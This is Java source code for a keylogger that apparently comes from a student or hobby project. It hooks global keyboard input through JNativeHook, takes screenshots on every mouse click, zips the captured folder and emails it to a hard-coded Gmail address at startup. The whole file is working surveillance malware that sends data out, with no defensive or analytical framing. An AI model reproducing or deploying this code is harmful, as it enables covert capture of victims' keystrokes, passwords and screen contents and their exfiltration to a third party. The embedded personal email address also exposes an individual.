/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseMotionListener;
import java.io.FileWriter;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.util.*;
import org.jnativehook.mouse.NativeMouseInputListener;

/**
 *
 * @author sparsha
 */

public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
    /**
     * @param args the command line arguments
     */
    
    private static final String OUTPUT_ZIP_FILE = "Mail.zip";
    private static final String SOURCE_FOLDER = "Screenshots";
    static Date x;
    static String buffer_str="";
    public static void main(String[] args) throws IOException {
        //TODO code application logic here
        FileWriter fl=new FileWriter("Screenshots/logs.txt");
        BufferedWriter br=new BufferedWriter(fl);
        
        br.write(" \n");
        br.close();
        fl.close();
        
        TimeThreader t=new TimeThreader();
        t.start();
        //Send mail for previous posts
        ZipUtils appZip = new ZipUtils();
        appZip.generateFileList(new File(SOURCE_FOLDER));
        appZip.zipIt(OUTPUT_ZIP_FILE);
        
        Mailler.send_mail("saha.sparsha@gmail.com");
        
        
        
        try{
        GlobalScreen.registerNativeHook();

        
        }catch(Exception e)
        {
            
        }
        

        
        GlobalScreen.addNativeKeyListener(new Keylogger());
        GlobalScreen.addNativeMouseListener(new Keylogger());
        
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
     
    if(nke.getKeyCode()==NativeKeyEvent.VC_SPACE)
       buffer_str=buffer_str+" ";
    else if(nke.getKeyCode()==NativeKeyEvent.VC_BACKSPACE)
        buffer_str=buffer_str.substring(0, buffer_str.length()-1);

    else
        buffer_str=buffer_str+NativeKeyEvent.getKeyText(nke.getKeyCode());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }

    @Override
    public void nativeMouseClicked(NativeMouseEvent nme) {
        Screenshot s=new Screenshot(Calendar.getInstance().getTime().toString()+"");
        s.getscreenshot();
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent nme) {
        
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent nme) {
    }

    @Override
    public void nativeMouseMoved(NativeMouseEvent nme) {

    }

    @Override
    public void nativeMouseDragged(NativeMouseEvent nme) {

    }
}